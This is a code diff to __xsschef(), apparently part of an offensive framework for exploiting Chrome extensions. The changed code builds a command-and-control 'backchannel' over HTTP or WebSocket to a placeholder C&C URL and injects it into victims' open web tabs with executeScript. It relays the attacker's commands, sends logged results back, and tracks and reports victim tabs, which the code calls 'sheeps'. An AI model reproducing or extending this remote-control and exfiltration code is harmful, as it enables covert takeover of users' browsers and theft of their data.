@@ -41,9 +41,9 @@ function __xsschef() {
         }
     }
     
-    var backchannel_script = function() {
+    var backchannel_script = function(__p) {
         var url = '__URL__';
-
+        
         if (url.match(/^http/)) { // http backchannel
 
             /* receive commands from ext and send the results to c&c */
@@ -77,7 +77,6 @@ function __xsschef() {
 
         } else if (url.match(/^ws/)) { // WebSocket based backchannel
             var ws = new WebSocket(url,'chef');
-            
             /* receive commands from ext and send the results to c&c */
             __p.onMessage.addListener(function(msg) {
                 switch (msg.cmd) {
@@ -105,20 +104,8 @@ function __xsschef() {
 
     
     // END scripts
-    
-    // todo: make ext the backchannel itself, if permissions allow
-    chrome.permissions.contains({
-      origins: ['http://*/*']
-    }, function(result) {
-        if (result) {
-            // extension has permissions for XHR on our C&C domain
-            // and set a direct log function
-        } else {
-            // proxy the requests to C&C through backchannel tab
-        }
-    });
 
-    
+
     var log = function() {
         if (backchannel) {
             backchannel.postMessage({'cmd':'log', 'p': [].slice.call(arguments)});
@@ -141,7 +128,7 @@ function __xsschef() {
             }
         }
     });
-    
+
     // when tab has been removed
     chrome.tabs.onRemoved.addListener(function(tabId, changeInfo) {
         delete sheeps[tabId];
@@ -222,23 +209,42 @@ function __xsschef() {
     });    
 
     var setupBackchannel = function(tabId, oncomplete) {
-        chrome.tabs.executeScript(tabId, 
-            {'code': '(function(){var __p=chrome.extension.connect({name:"backchannel"});('+backchannel_script.toString()+')();})();'}
-                ,function() {setTimeout(oncomplete, 500)});
+        if (tabId == -1) {
+            __p = chrome.extension.connect({name:"backchannel"});
+            backchannel_script(__p);
+        } else {
+            chrome.tabs.executeScript(tabId, 
+                {'code': '(function(){var __p=chrome.extension.connect({name:"backchannel"});('+backchannel_script.toString()+')(__p);})();'}
+                    ,function() {setTimeout(oncomplete, 500)});
+        }
     }
     
-    // setup backchannel port in first http/https tab
-    chrome.tabs.query({url: '<all_urls>'}, function(tabs) {
-        var t;
-        for (var i=0; i<tabs.length; i++) {
-            t = tabs[i];
-            if (t.url.match(/^http/)) {
-                setupBackchannel(t.id, init_complete);
-                return;
-            }
+    // todo: make ext the backchannel itself, if permissions allow
+    chrome.permissions.contains({
+      origins: ['http://*/*']
+    }, function(yes_i_can) {
+        
+        if (false && yes_i_can) { // this does not for for now, don't know why
+            // extension has permissions for XHR on our C&C domain
+            // and set a direct log function
+            setupBackchannel(-1, init_complete);
+        } else {
+            // proxy the requests to C&C through backchannel tab
+            // setup backchannel port in first http/https tab
+            chrome.tabs.query({url: '<all_urls>'}, function(tabs) {
+                var t;
+                for (var i=0; i<tabs.length; i++) {
+                    t = tabs[i];
+                    if (t.url.match(/^http/)) {
+                        setupBackchannel(t.id, init_complete);
+                        return;
+                    }
+                }
+            }); 
         }
     });
-    
+
+
     var report_tabs = function() {
         log('reporting tabs');
         chrome.tabs.query({}, function(t) {
